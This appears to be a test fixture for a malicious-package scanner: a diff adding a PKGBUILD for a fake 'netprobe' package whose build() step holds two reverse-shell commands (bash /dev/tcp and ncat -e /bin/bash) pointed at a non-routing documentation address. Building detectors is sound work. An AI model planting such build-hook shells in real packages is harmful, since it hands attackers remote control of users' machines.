@@ -1,0 +1,20 @@
+# wAURden test sample — MALICIOUS (inert). Reverse-shell primitives.
+# 192.0.2.0/24 is the RFC 5737 documentation range and does not route anywhere.
+pkgname=netprobe
+pkgver=0.3
+pkgrel=1
+pkgdesc="Network probe"
+arch=('x86_64')
+url="https://example.com"
+license=('MIT')
+source=("https://example.com/netprobe-0.3.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+    cd "$pkgname-$pkgver"
+    # bash pseudo-device reverse shell
+    bash -i >& /dev/tcp/192.0.2.55/4444 0>&1
+    # netcat exec variant
+    ncat 192.0.2.55 9001 -e /bin/bash
+    make
+}
